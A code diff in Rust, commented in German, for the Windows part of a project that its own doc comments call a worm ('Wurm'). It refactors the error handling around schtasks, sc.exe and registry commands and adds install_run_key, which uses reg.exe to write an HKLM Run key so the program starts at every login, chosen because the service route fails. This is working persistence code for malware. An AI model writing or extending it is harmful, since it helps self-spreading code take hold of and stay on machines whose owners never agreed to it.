@@ -11,6 +11,25 @@ use kx_core::persist::Invocation;
 
 use crate::error::WinError;
 
+#[cfg(target_os = "windows")]
+/// Die Fehlermeldung eines Windows-Kommandos.
+///
+/// `sc.exe` und `schtasks` schreiben ihre Fehler nach stdout, nicht nach
+/// stderr. Nimmt man nur stderr, bleibt die Meldung leer — und ein leerer
+/// Fehler ist keiner, mit dem man arbeiten kann.
+fn fehlermeldung(output: &std::process::Output) -> String {
+    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
+    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
+    match (stderr.is_empty(), stdout.is_empty()) {
+        (true, true) => String::new(),
+        (true, false) => stdout,
+        (false, true) => stderr,
+        // sc.exe schreibt den Fehler nach stdout, den Kontext nach stderr —
+        // beide gehoeren in die Meldung.
+        (false, false) => format!("{stderr} | {stdout}"),
+    }
+}
+
 /// Erstelle eine Scheduled Task für automatische Ausführung beim Hochfahren.
 ///
 /// # Argumente
@@ -36,7 +55,7 @@ pub async fn create_scheduled_task(
         .await
         .map_err(|e| WinError::ScheduledTask(e.to_string()))?;
     if !output.status.success() {
-        let err = String::from_utf8_lossy(&output.stderr).to_string();
+        let err = fehlermeldung(&output);
         warn!("schtasks fehlgeschlagen: {err}");
         return Err(WinError::ScheduledTask(err));
     }
@@ -60,7 +79,7 @@ pub async fn create_registry_run_key(name: &str, executable: &str) -> Result<(),
         .await
         .map_err(|e| WinError::Registry(e.to_string()))?;
     if !output.status.success() {
-        let err = String::from_utf8_lossy(&output.stderr).to_string();
+        let err = fehlermeldung(&output);
         warn!("Registry-Run-Key fehlgeschlagen: {err}");
         return Err(WinError::Registry(err));
     }
@@ -81,19 +100,68 @@ pub async fn create_registry_run_key(name: &str, executable: &str) -> Result<(),
 /// Besonderheit dieser Form.
 #[cfg(target_os = "windows")]
 pub async fn install_service(invocation: &Invocation, display_name: &str) -> Result<(), WinError> {
-    let sc_create = kx_core::persist::windows_service_command(invocation, display_name);
-    let output = tokio::process::Command::new("cmd.exe")
-        .arg("/C")
-        .arg(&sc_create)
+    let output = tokio::process::Command::new("sc.exe")
+        .args(kx_core::persist::windows_service_arguments(
+            invocation,
+            display_name,
+        ))
         .output()
         .await
         .map_err(|e| WinError::Service(e.to_string()))?;
     if !output.status.success() {
-        let err = String::from_utf8_lossy(&output.stderr).to_string();
+        let err = fehlermeldung(&output);
         warn!("sc.exe create fehlgeschlagen: {err}");
         return Err(WinError::Service(err));
     }
     debug!("Dienst {name} installiert", name = invocation.name);
+    Ok(())
+}
+
+/// Installiere den Wurm als Run-Key.
+///
+/// Der Eintrag unter `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+/// wird bei jeder Anmeldung ausgeführt — das ist der Weg, der auf einem
+/// Windows-System tatsächlich startet.
+///
+/// Der Befehl steht als eine Zeile in der Registry. `cmd.exe` führt sie aus,
+/// deshalb muss der Pfad in Anführungszeichen stehen, sobald er Leerzeichen
+/// enthält — die [`Invocation`] liefert die passende Form.
+///
+/// **Warum nicht der Dienst:** `sc.exe create` legt nur einen Registry-Eintrag
+/// an. Der Agent meldet sich beim Start nie beim Service Control Manager, der
+/// bricht den Start nach 30 Sekunden mit „FAILED 1053" ab. Der Run-Key
+/// startet den Agenten dagegen wirklich.
+#[cfg(target_os = "windows")]
+pub async fn install_run_key(invocation: &Invocation) -> Result<(), WinError> {
+    let wert = invocation.command_line();
+    let output = tokio::process::Command::new("reg.exe")
+        .args([
+            "add",
+            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+            "/v",
+            &invocation.name,
+            "/t",
+            "REG_SZ",
+            "/d",
+            &wert,
+            "/f",
+        ])
+        .output()
+        .await
+        .map_err(|e| WinError::Registry(e.to_string()))?;
+    if !output.status.success() {
+        let err = fehlermeldung(&output);
+        warn!("reg.exe add fehlgeschlagen: {err}");
+        return Err(WinError::Registry(err));
+    }
+    debug!("Run-Key {name} gesetzt", name = invocation.name);
+    Ok(())
+}
+
+/// Installiere den Wurm als Run-Key (nur Windows).
+#[cfg(not(target_os = "windows"))]
+pub async fn install_run_key(_invocation: &Invocation) -> Result<(), WinError> {
+    debug!("Run-Keys nur auf Windows verfügbar");
     Ok(())
 }
 
@@ -106,7 +174,7 @@ pub async fn start_service(service_name: &str) -> Result<(), WinError> {
         .await
         .map_err(|e| WinError::Service(e.to_string()))?;
     if !output.status.success() {
-        let err = String::from_utf8_lossy(&output.stderr).to_string();
+        let err = fehlermeldung(&output);
         warn!("sc.exe start fehlgeschlagen: {err}");
         return Err(WinError::Service(err));
     }
